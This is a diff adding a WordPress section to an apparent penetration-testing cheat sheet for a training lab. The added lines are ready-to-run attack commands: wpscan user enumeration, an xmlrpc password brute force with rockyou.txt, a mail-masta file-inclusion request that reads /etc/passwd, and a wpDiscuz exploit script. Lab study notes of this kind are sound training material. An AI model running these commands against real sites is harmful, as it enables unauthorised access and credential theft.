@@ -2213,8 +2213,29 @@ Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB cre
 
 # Wordpress
 ```bash
+# wordpress version
+curl -s http://blog.inlanefreight.local | grep WordPress
 
+# themes
+curl -s http://blog.inlanefreight.local/ | grep themes
 
+# plugins
+curl -s http://blog.inlanefreight.local/ | grep plugins
+
+# wpscan
+sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
+
+# user enum
+wpscan --url http://blog.inlanefreight.local --enumerate u
+
+# login brute force
+sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+
+# Vulnerable Plugins - mail-masta
+curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
+# Vulnerable Plugins - wpDiscuz
+python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 ```
 
 # Active Directory
